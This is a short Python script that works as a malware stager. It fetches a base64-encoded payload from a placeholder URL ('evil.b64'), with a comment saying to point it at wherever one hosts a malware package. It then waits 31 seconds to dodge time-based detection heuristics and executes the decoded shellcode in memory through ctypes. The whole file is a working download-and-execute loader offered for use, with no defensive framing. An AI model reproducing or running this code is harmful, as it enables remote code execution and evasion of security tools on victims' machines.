#!/usr/bin/python

from ctypes import *
from base64 import b64decode
from urllib import urlopen
from time import sleep

URL = "http://server.com/evil.b64" # This should be changed to wherever you are hosting your malware package

downloader = urlopen(URL) # download the package
shellcode = b64decode(downloader.read()) # de-base64 the shellcode
sleep(31) # avoid time-based heuristics
array = create_string_buffer(shellcode, len(shellcode))
shell = cast(array, CFUNCTYPE(c_void_p))
shell()
